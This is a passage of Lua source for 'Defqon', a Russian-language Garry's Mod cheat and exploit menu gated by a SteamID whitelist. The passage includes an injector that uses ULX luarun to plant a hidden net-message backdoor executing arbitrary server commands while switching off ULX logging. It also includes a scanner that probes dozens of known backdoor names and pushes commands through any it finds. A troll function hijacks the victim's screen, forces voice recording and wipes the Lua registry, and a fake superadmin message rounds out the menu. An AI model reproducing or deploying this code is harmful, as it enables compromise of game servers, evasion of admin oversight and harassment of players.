or FillFrameRates == "STEAM_0:0:106930709" -- Niceman
or FillFrameRates == "STEAM_1:1:106930709" -- Niceman
or FillFrameRates == "STEAM_0:0:106930709" -- Niceman
or FillFrameRates == "STEAM_0:0:53025026" -- Niceman
or FillFrameRates == "STEAM_0:1:119416004" -- Numio
or FillFrameRates == "STEAM_0:0:54631898"  -- Chezzy
or FillFrameRates == "STEAM_0:1:125198366" -- hason
or FillFrameRates == "STEAM_0:0:78588335" -- Цыган
or FillFrameRates == "STEAM_0:1:76365398" -- lord
or FillFrameRates == "STEAM_0:0:130906952" -- bagi
or FillFrameRates == "STEAM_0:0:425436001" -- maddog
or FillFrameRates == "STEAM_0:0:136980892" -- adan
or FillFrameRates == "STEAM_0:1:429886649" -- Scroller
or FillFrameRates == "STEAM_0:1:123796452"
or FillFrameRates == "STEAM_0:0:91988659"
or FillFrameRates == "STEAM_0:1:97208355"
or FillFrameRates == "STEAM_0:1:433086746"
or FillFrameRates == "STEAM_0:0:114759765"
or FillFrameRates == "STEAM_0:1:99903222"
or FillFrameRates == "STEAM_0:1:190990405"
or FillFrameRates == "STEAM_0:0:434743633"
or FillFrameRates == "STEAM_1:1:223170502"
or FillFrameRates == "STEAM_1:0:223170502"
or FillFrameRates == "STEAM_0:1:223170502"
or FillFrameRates == "STEAM_0:0:223170502"
or FillFrameRates == "STEAM_0:0:118496131"
or FillFrameRates == "STEAM_0:1:36913004"
or FillFrameRates == "STEAM_0:0:111103319" -- ВЕЛИКИЙ!!!!!!!!!!!!!!!!!!!!!!!!!!!!
or FillFrameRates == "STEAM_0:0:224821474"
or FillFrameRates == "STEAM_0:0:176251033"
or FillFrameRates == "STEAM_0:1:122907806" -- english user
or FillFrameRates == "STEAM_0:0:435948263"
or FillFrameRates == "STEAM_0:1:436014361"
or FillFrameRates == "STEAM_0:0:436021942"
or FillFrameRates == "STEAM_0:0:175846419"
or FillFrameRates == "STEAM_0:0:146683682"
or FillFrameRates == "STEAM_0:1:146683682"
or FillFrameRates == "STEAM_1:0:146683682"
or FillFrameRates == "STEAM_1:1:146683682"
or FillFrameRates == "STEAM_0:1:100008351"
or FillFrameRates == "STEAM_0:0:100008351"
or FillFrameRates == "STEAM_1:0:100008351"
or FillFrameRates == "STEAM_0:1:97208355"
or FillFrameRates == "STEAM_0:0:205920664"
or FillFrameRates == "STEAM_0:1:433082549"
or FillFrameRates == "STEAM_0:1:433086746"
or FillFrameRates == "STEAM_0:0:436021942"
or FillFrameRates == "STEAM_0:0:435948263"
or FillFrameRates == "STEAM_0:1:436014361"
or FillFrameRates == "STEAM_0:1:434629768"
or FillFrameRates == "STEAM_0:1:116875024"
or FillFrameRates == "STEAM_0:1:105744181"
or FillFrameRates == "STEAM_0:1:173519656"
or FillFrameRates == "STEAM_0:1:215497345"
or true
then
LocalPlayer():EmitSound("weapons/ar2/ar2_reload_push.wav",500,100)
iZNX.Menu = vgui.Create("DFrame")
iZNX.Menu:SetSize(950,820)
iZNX.Menu:SetTitle("")
iZNX.Menu:Center()
iZNX.Menu:MakePopup()
iZNX.Menu.gay = table.Count( iZNX.sploits )
iZNX.Menu.Paint = function( s, w, h )
surface.SetDrawColor( Color(41, 41, 41) ) -- Цвет обводки внутри меню (41 41 41)
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 245) ) -- Обводка меню
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(33, 33, 33) ) -- Цвет меню в центре
surface.DrawRect( 80, 25, w - 90, h - 35 )
surface.SetDrawColor( Color(100, 100, 100, 200) )
draw.DrawText( "Defqon v 5.1.1\nExploits: "..iZNX.Menu.gay, "default", 8, 15, Color(255,255,255, 350) )
draw.DrawText( "17.03.18", "default", 8, 40, Color(255,255,255, 350) )
draw.DrawText( "---------------","HUDLogo2", 6, 664, Color(255,255,255, 10000) )
draw.DrawText( "Остальное","HUDLogo2", 5, 652, Color(255,255,255, 10000) )
draw.DrawText( "---------------","HUDLogo2", 6, 638, Color(255,255,255, 10000) )
end
local Plist = vgui.Create( "DPanelList", iZNX.Menu )
Plist:SetSize( iZNX.Menu:GetWide() - 90, iZNX.Menu:GetTall() - 35 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 80, 25 )
Plist:SetName( "" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 765, "Ноклип", Noclip, "ClientSide Noclip" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 792, "Инжектор", Inject, "Инжектит фирменный Backdoor на сервер" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 737, "Бэкдур чек", checkbackdoors, "Лист бэкдуров aka чек сервера на бэкдуры (смотреть в консоль)" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 710, "Админ-хак", lmfao, "Фейк ULX выдача SuperAdmin, можно сделать скриншот, мол вы хакер" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 683, "Не нажимать", lmfao1, "НЕ НАЖИМАТЬ!!" )
iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 67, "Создатель", gui.url, "Ссылка на страницу создателя меню" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 148, "Сканер", iZNX.ScanPlayers, "Сканирует игроков" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 121, "Чек Версии", CheckVersion, "Чек версии чита" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 175, "RainbowGun", rainbowphysgun, "Включает радужный физган" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 202, "RunLuaCode", editor, "Run on self - Запуск луа кода на себя" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 229, "WallHack", WHT, "Включает вх" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 256, "BunnyHop", Bhop, "Обыкновенный бхоп" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 283, "Big Menu", bigmenu, "Big Menu" )
iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 94, "Анти-Читы", anticheats, "Показывает меры безопасности (Скринграбы, анти-читы и т.д)" )
local function CreateSploitPanel( name, t )
if !iZNX.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 70 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.SetDrawColor( Color(41, 41, 41, 245) ) -- Цвет эксплойтов
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( severitycols[t.severity] )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawLine( 0, 24, w, 24 )
draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )
draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) )
end
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + iZNX.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + iZNX.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + iZNX.HTXBackdoor( cmdp, x, 42, tab.name )
elseif tab.typ == "soundboard" then
x = (x + 5) + iZNX.SoundBoard( cmdp, x, 42, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + iZNX.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + iZNX.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( iZNX.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
else
chink = false
timer.Create("HackersLol", 1, 0, function()
	if chink then
		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ты за это не заплатил!" )
	else
		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ухади!1!" )
	end
	chink = !chink
end)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Чёртов пират, уходи!" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Не заплатил - меню не получил!" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), ":^)" )
RunConsoleCommand( "sdbhfbgf" )
return end
end)













































------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--[[ --------------------------------------------------------------
      _____     _          _   _ _        _   _            _
     |  ___|_ _| | _____  | | | | |_  __ | | | | __ _  ___| | __
     | |_ / _` | |/ / _ \ | | | | \ \/ / | |_| |/ _` |/ __| |/ /
     |  _| (_| |   <  __/ | |_| | |>  <  |  _  | (_| | (__|   <
     |_|  \__,_|_|\_\___|  \___/|_/_/\_\ |_| |_|\__,_|\___|_|\_\

    ---------------------------------------------------------------]]

function lmfao()
surface.PlaySound("garrysmod/ui_click.wav")
if( ulx ) then
chat.AddText( Color( 0, 0, 0, 255 ), "(Console) ", Color( 160, 200, 200, 255 ), "added ", Color( 80, 0, 120, 255 ), "You ", Color( 160, 200, 200, 255 ), "to group ", Color( 0, 255, 0, 255 ), "superadmin" )
else
chat.AddText( "На этом сервере не установлен ULX" )
end
end
CCA( "Defqon_adduser", lmfao )
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


--[[ ----------------------------------------------------------------------------------
      ____              _ _      ____ _ _      _      ____        _   _
     |  _ \  ___  _ __ ( ) |_   / ___| (_) ___| | __ | __ ) _   _| |_| |_ ___  _ __
     | | | |/ _ \| '_ \|/| __| | |   | | |/ __| |/ / |  _ \| | | | __| __/ _ \| '_ \
     | |_| | (_) | | | | | |_  | |___| | | (__|   <  | |_) | |_| | |_| || (_) | | | |
     |____/ \___/|_| |_|  \__|  \____|_|_|\___|_|\_\ |____/ \__,_|\__|\__\___/|_| |_|

     ----------------------------------------------------------------------------------]]

function lmfao1()
surface.PlaySound("garrysmod/ui_click.wav")
local msg = "Подожди. . ."
surface.CreateFont("lolwutbet", {size=75})
local function huddrawdetour()
	draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), HSVToColor( CurTime() % 6 * 60, 1, 1 ))
	draw.RoundedBox(0, 0, ScrH() / 3.5, ScrW(), ScrH() / 4.5, Color(0, 0, 0))
	draw.SimpleText(msg, "lolwutbet", ScrW() / 2, ScrH() / 2.5, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end


for k,v in pairs(hook.GetTable()) do
	for o,j in pairs(v) do
		if k == "HUDPaint" then
			hook.Remove(k, o)
			hook.Add(k, o, huddrawdetour)
		end
	end
end
hook.Add("HUDPaint","eztoirkfghdjbnvxc", huddrawdetour)

timer.Create("wowlolwut_my_boi",2 ,0 , function()
	msg = table.Random({
		"Зачем ты нажал?",
		"cl_yawspeed 8",
		"-right",
		"Почему ты это сделал ?",
		"Я уже взламываю твой аккаунт",
		"Я же написал, чтоб ты не нажимал",
		"Команды на экране",
		"u n00b",
		"-right",
		"1337 h4ck3r",
		"Больше не нажимай на меня, ок?",
		"cl_yawspeed 8",
		"Надеюсь, ты усвоил урок",
		"..."})
end)

timer.Create("lgfholjghlfdsh",0 ,0 , function()
	MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "ЗАПУСТИ МЕНЯ ЕЩЕ РАЗ, ДАВАЙ, СДЕЛАЙ ЭТО!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! !\n")
end)
sound.PlayURL("http://d.zaix.ru/5Kko.mp3","mono noblock", function( s )
	s:Play()
end)
LocalPlayer():ConCommand("+voicerecord")
LocalPlayer():ConCommand("cl_yawspeed 9999")
LocalPlayer():ConCommand("+right")
MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "Нажми escape !\n")
timer.Simple(5 * 60, function()
	table.Empty(debug.getregistry())
end )
end
concommand.Add( "Music_troll", lmfao1 )
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--[[------------------------------------------------------------------
        ____      _           ____ _               _
       / ___|__ _| | _____   / ___| |__   ___  ___| | _____ _ __
      | |   / _` | |/ / _ \ | |   | '_ \ / _ \/ __| |/ / _ \ '__|
      | |__| (_| |   <  __/ | |___| | | |  __/ (__|   <  __/ |
       \____\__,_|_|\_\___|  \____|_| |_|\___|\___|_|\_\___|_|

    ------------------------------------------------------------------]]

if (_G.QAC or _G.CAC) then
        surface.PlaySound("ambient/alarms/klaxon1.wav")
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "На сервере стоит Cake Anti Cheat!")
end
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local ply = LocalPlayer()
function Noclip()
surface.PlaySound("garrysmod/ui_click.wav")
ply:ConCommand( "Defqon_noclip" )
end
local SW = {}
SW.Enabled = false
SW.ViewOrigin = Vector( 0, 0, 0 )
SW.ViewAngle = Angle( 0, 0, 0 )
SW.Velocity = Vector( 0, 0, 0 )
function SW.CalcView( ply, origin, angles, fov )
    if ( !SW.Enabled ) then return end
        if ( SW.SetView ) then
        SW.ViewOrigin = origin
        SW.ViewAngle = angles
        SW.SetView = false
        end
    return { origin = SW.ViewOrigin, angles = SW.ViewAngle }
end
hook.Add( "CalcView", "SpiritWalk", SW.CalcView )
function SW.CreateMove( cmd )
    if ( !SW.Enabled ) then return end

    local time = FrameTime()
    SW.ViewOrigin = SW.ViewOrigin + ( SW.Velocity * time )
    SW.Velocity = SW.Velocity * 0.95

    local sensitivity = 0.022
    SW.ViewAngle.p = math.Clamp( SW.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
    SW.ViewAngle.y = SW.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )


    local add = Vector( 0, 0, 0 )
    local ang = SW.ViewAngle
    if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() end
    if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() end
    if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() end
    if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() end
    if ( cmd:KeyDown( IN_JUMP ) ) then add = add + ang:Up() end
    if ( cmd:KeyDown( IN_DUCK ) ) then add = add - ang:Up() end
    add = add:GetNormal() * time * 3000
    if ( cmd:KeyDown( IN_SPEED ) ) then add = add * 2 end

    SW.Velocity = SW.Velocity + add
    if ( SW.LockView == true ) then
      SW.LockView = cmd:GetViewAngles()
    end
    if ( SW.LockView ) then
        cmd:SetViewAngles( SW.LockView )
    end
    cmd:SetForwardMove( 0 )
    cmd:SetSideMove( 0 )
    cmd:SetUpMove( 0 )
end
hook.Add( "CreateMove", "SpiritWalk", SW.CreateMove )
    function SW.Toggle()
    SW.Enabled = !SW.Enabled
    SW.LockView = SW.Enabled
    SW.SetView = true
    local status = { [ true ] = "ON", [ false ] = "OFF" }
end
concommand.Add( "Defqon_noclip", SW.Toggle )

function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

-- Superadmin Injector
function Inject()
surface.PlaySound("garrysmod/ui_click.wav")
    chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 255, 255 )," Инжектим..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function()
            if( ValidNetString("DefqonBackdoor") ) then

            else
                RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('DefqonBackdoor')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('DefqonBackdoor') net.Receive('DefqonBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 0, 255, 0 )," Успешно заинжекчено!" )
            end
        end )
    else
        chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 0, 0 )," Failed! Вы не superadmin!" )
    end
    if( ValidNetString("DefqonBackdoor") ) then
        chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 255, 255 )," Backdoor уже загружен!" )
    end
end




-- Backdoor Checker
function checkbackdoors()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 255, 255 )," В консоль посмотрите" )
if( ValidNetString("Sbox_darkrp") ) then
        print( "[Defqon] Найден Backdoor! -   Sbox_darkrp" )
    end

if( ValidNetString("_Defqon") ) then
        print( "[Defqon] Найден Backdoor! -   _Defqon" )
    end

if( ValidNetString("Sandbox_ArmDupe") ) then
        print( "[Defqon] Найден Backdoor! -   Sandbox_ArmDupe" )
    end
if( ValidNetString("Sbox_itemstore") ) then
        print( "[Defqon] Найден Backdoor! -   Sbox_itemstore" )
    end
if( ValidNetString("Ulib_Message") ) then
        print( "[Defqon] Найден Backdoor! -   Ulib_Message" )
end
if( ValidNetString("ULogs_Info") ) then
        print( "[Defqon] Найден Backdoor! -   ULogs_Info" )
end
if( ValidNetString("ITEM") ) then
        print( "[Defqon] Найден Backdoor! -   ITEM" )
end
if( ValidNetString("fix") ) then
        print( "[Defqon] Найден Backdoor! -   fix" )
end
if( ValidNetString("Fix_Keypads") ) then
        print( "[Defqon] Найден Backdoor! -   Fix_Keypads" )
end
if( ValidNetString("Remove_Exploiters") ) then
        print( "[Defqon] Найден Backdoor! -   Remove_Exploiters" )
end
if( ValidNetString("noclipcloakaesp_chat_text") ) then
        print( "[Defqon] Найден Backdoor! -   noclipcloakaesp_chat_text" )
end
if( ValidNetString("_CAC_ReadMemory") ) then
        print( "[Defqon] Найден Backdoor! -   _CAC_ReadMemory" )
end
if( ValidNetString("nostrip") ) then
        print( "[Defqon] Найден Backdoor! -   nostrip" )
end
if( ValidNetString("nocheat") ) then
        print( "[Defqon] Найден Backdoor! -   nocheat" )
end
if( ValidNetString("LickMeOut") ) then
        print( "[Defqon] Найден Backdoor! -   LickMeOut" )
end
if( ValidNetString("ULX_QUERY2") ) then
        print( "[Defqon] Найден Backdoor! -   ULX_QUERY2" )
end
if( ValidNetString("MoonMan") ) then
        print( "[Defqon] Найден Backdoor! -   MoonMan" )
end
if( ValidNetString("Im_SOCool") ) then
        print( "[Defqon] Найден Backdoor! -   Im_SOCool" )
end
if( ValidNetString("Sandbox_GayParty") ) then
        print( "[Defqon] Найден Backdoor! -   Sandbox_GayParty" )
end
if( ValidNetString("DarkRP_UTF8") ) then
        print( "[Defqon] Найден Backdoor! -   DarkRP_UTF8" )
end
if( ValidNetString("oldNetReadData") ) then
        print( "[Defqon] Найден Backdoor! -   oldNetReadData" )
end
if( ValidNetString("memeDoor") ) then
        print( "[Defqon] Найден Backdoor! -   memeDoor" )
end
if( ValidNetString("BackDoor") ) then
        print( "[Defqon] Найден Backdoor! -   BackDoor" )
end
if( ValidNetString("OdiumBackDoor") ) then
        print( "[Defqon] Найден Backdoor! -   OdiumBackDoor" )
end
if( ValidNetString("cucked") ) then
        print( "[Defqon] Найден Backdoor! -   cucked" )
end
if( ValidNetString("NoNerks") ) then
        print( "[Defqon] Найден Backdoor! -   NoNerks" )
end
if( ValidNetString("kek") ) then
        print( "[Defqon] Найден Backdoor! -   kek" )
end
if( ValidNetString("ZimbaBackDoor") ) then
        print( "[Defqon] Найден Backdoor! -   ZimbaBackDoor" )
end
if( ValidNetString("something") ) then
        print( "[Defqon] Найден Backdoor! -   something" )
end
if( ValidNetString("random") ) then
        print( "[Defqon] Найден Backdoor! -   random" )
end
if( ValidNetString("strip0") ) then
        print( "[Defqon] Найден Backdoor! -   strip0" )
end
if( ValidNetString("DarkRP_AdminWeapons") ) then
        print( "[Defqon] Найден Backdoor! -   DarkRP_AdminWeapons" )
end
if( ValidNetString("SessionBackdoor") ) then
        print( "[Defqon] Найден Backdoor! -   SessionBackdoor" )
end
if( ValidNetString("ULXQUERY2") ) then
        print( "[Defqon] Найден Backdoor! -   ULXQUERY2" )
end
if( ValidNetString("fellosnake") ) then
        print( "[Defqon] Найден Backdoor! -   fellosnake" )
end
if( ValidNetString("enablevac") ) then
        print( "[Defqon] Найден Backdoor! -   enablevac" )
end
if( ValidNetString("idk") ) then
        print( "[Defqon] Найден Backdoor! -   idk" )
end
if( ValidNetString("c") ) then
        print( "[Defqon] Найден Backdoor! -   c" )
end
if( ValidNetString("killserver") ) then
        print( "[Defqon] Найден Backdoor! -   killserver" )
end
if( ValidNetString("fuckserver") ) then
        print( "[Defqon] Найден Backdoor! -   fuckserver" )
end
if( ValidNetString("cvaraccess") ) then
        print( "[Defqon] Найден Backdoor! -   cvaraccess" )
end
if( ValidNetString("rcon") ) then
        print( "[Defqon] Найден Backdoor! -   rcon" )
end
if( ValidNetString("rconadmin") ) then
        print( "[Defqon] Найден Backdoor! -   rconadmin" )
end
if( ValidNetString("web") ) then
        print( "[Defqon] Найден Backdoor! -   web" )
end
if( ValidNetString("jesuslebg") ) then
        print( "[Defqon] Найден Backdoor! -   jesuslebg" )
end
if( ValidNetString("zilnix") ) then
        print( "[Defqon] Найден Backdoor! -   zilnix" )
end
if( ValidNetString("Þà?D)◘") ) then
        print( "[Defqon] Найден Backdoor! -   Þà?D)◘" )
end
if( ValidNetString("disablebackdoor") ) then
        print( "[Defqon] Найден Backdoor! -   disablebackdoor" )
end
if( ValidNetString("kill") ) then
        print( "[Defqon] Найден Backdoor! -   kill" )
end
if( ValidNetString("DefqonBackdoor") ) then
        print( "[Defqon] Найден Фирменный Backdoor! -   DefqonBackdoor" )
end
end


-- Auto-Backdoor checker
    if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then
        netKey = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end

	if( ValidNetString("enablevac") ) then
        netKey = "enablevac"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        netKey = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end
    if( ValidNetString("Sbox_itemstore") ) then
        netKey = "Sbox_itemstore"
    else
    end
	if( ValidNetString("Ulib_Message") ) then
        netKey = "Ulib_Message"
    else
    end
	if( ValidNetString("Sbox_darkrp") ) then
        netKey = "Sbox_darkrp"
    else
    end
	if( ValidNetString("ULogs_Info") ) then
        netKey = "ULogs_Info"
    else
    end
	if( ValidNetString("ITEM") ) then
        netKey = "ITEM"
    else
    end
	if( ValidNetString("fix") ) then
        netKey = "fix"
    else
    end
	if( ValidNetString("nocheat") ) then
        netKey = "nocheat"
    else
    end
	if( ValidNetString("ULX_QUERY2") ) then
        netKey = "ULX_QUERY2"
    else
    end
	if( ValidNetString("Sandbox_GayParty") ) then
        netKey = "Sandbox_GayParty"
    else
    end
	if( ValidNetString("DarkRP_UTF8") ) then
        netKey = "DarkRP_UTF8"
    else
    end
	if( ValidNetString("oldNetReadData") ) then
        netKey = "oldNetReadData"
    else
    end
	if( ValidNetString("BackDoor") ) then
        netKey = "BackDoor"
    else
    end
	if( ValidNetString("OdiumBackDoor") ) then
        netKey = "OdiumBackDoor"
    else
    end
	if( ValidNetString("cucked") ) then
        netKey = "cucked"
    else
    end
	if( ValidNetString("NoNerks") ) then
        netKey = "NoNerks"
    else
    end
	if( ValidNetString("kek") ) then
        netKey = "kek"
    else
    end
	if( ValidNetString("ZimbaBackDoor") ) then
        netKey = "ZimbaBackDoor"
    else
    end
	if( ValidNetString("something") ) then
        netKey = "something"
    else
    end
	if( ValidNetString("random") ) then
        netKey = "random"
    else
    end
	if( ValidNetString("strip0") ) then
        netKey = "strip0"
    else
    end
	if( ValidNetString("fellosnake") ) then
        netKey = "fellosnake"
    else
    end
	if( ValidNetString("idk") ) then
        netKey = "idk"
    else
    end
	if( ValidNetString("c") ) then
        netKey = "c"
    else
    end
	if( ValidNetString("killserver") ) then
        netKey = "killserver"
    else
    end
	if( ValidNetString("fuckserver") ) then
        netKey = "fuckserver"
    else
    end
	if( ValidNetString("cvaraccess") ) then
        netKey = "cvaraccess"
    else
    end
	if( ValidNetString("rcon") ) then
        netKey = "rcon"
    else
    end
	if( ValidNetString("rconadmin") ) then
        netKey = "rconadmin"
    else
    end
	if( ValidNetString("web") ) then
        netKey = "web"
    else
    end
	if( ValidNetString("jesuslebg") ) then
        netKey = "jesuslebg"
    else
    end
	if( ValidNetString("zilnix") ) then
        netKey = "zilnix"
    else
    end
	if( ValidNetString("Þà?D)◘") ) then
        netKey = "Þà?D)◘"
    else
    end
	if( ValidNetString("disablebackdoor") ) then
        netKey = "disablebackdoor"
    else
    end
	if( ValidNetString("kill") ) then
        netKey = "kill"
    else
    end
	if( ValidNetString("DefqonBackdoor") ) then
        netKey = "DefqonBackdoor"
    else
    end
    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Бэкдуров на сервере не найдено." )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 0, 255, 0 ), "Найден .net Backdoor: ".. netKey )
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs Отключены." )
                end)
            end
    end

local function gmsg(msg,color)
if color == "color_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 150,0,0 )," ".. msg) return end
if color == "color_red_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 255,0,0 )," ".. msg) return end
if color == "color_green" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 43,255,0 )," ".. msg) return end
chat.AddText( "",Color( 255,0,0 ),"[Defqon] ",Color( 255,255,225 )," ".. msg)
end

function iZNX.ScanPlayers()
surface.PlaySound("garrysmod/ui_click.wav")
local playerscount = 0
local playerscount_admin = 0
local playerscount_hryak = 0
local playerscount_hryak_admin = 0
gmsg ("Группа - Ник - SID - Деньги")
 for k,v in pairs(player.GetAll()) do
    local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
            gmsg(v:GetUserGroup()..": " .. v:Nick() .. " - " .. v:SteamID() .. " - $" .. playermoney.. "","color_green")
 end
end

else -- Если SteamID не авторизован (чит украден, кто-то дал ссылку на него и т.п методы получения)

surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 50,
    weight = 1000,
})

surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})

concommand.Add("fucked", function()
LocalPlayer():EmitSound("ambient/alarms/klaxon1.wav",500,100)
LocalPlayer():EmitSound("ambient/alarms/klaxon1.wav",500,100)
LocalPlayer():EmitSound("ambient/alarms/klaxon1.wav",500,100)
LocalPlayer():EmitSound("ambient/alarms/klaxon1.wav",500,100)
LocalPlayer():EmitSound("ambient/alarms/klaxon1.wav",500,100)
LocalPlayer():EmitSound("ambient/alarms/klaxon1.wav",500,100)
    local Popup = vgui.Create("DFrame")
        Popup:SetSize( ScrW(), ScrH() )
        Popup:SetPos( 0,0 )
        Popup:SetVisible( true )
        Popup:SetDraggable( false )
        Popup:SetTitle( "" )
        Popup:MakePopup()
        Popup:ShowCloseButton( false )
        Popup.Paint = function(s,w,h)
        surface.SetDrawColor( Color(0,0,0,200) )
        surface.DrawRect( 0,0, w,h )
        surface.SetDrawColor( Color(240,0,0) )
        surface.DrawRect( 0, w/2-Popup:GetTall()/1.520, ScrW(), ScrH()/6.5 )
        surface.SetTextColor(255,255,255)
        surface.SetTextPos(w/5.10, h/2.40)
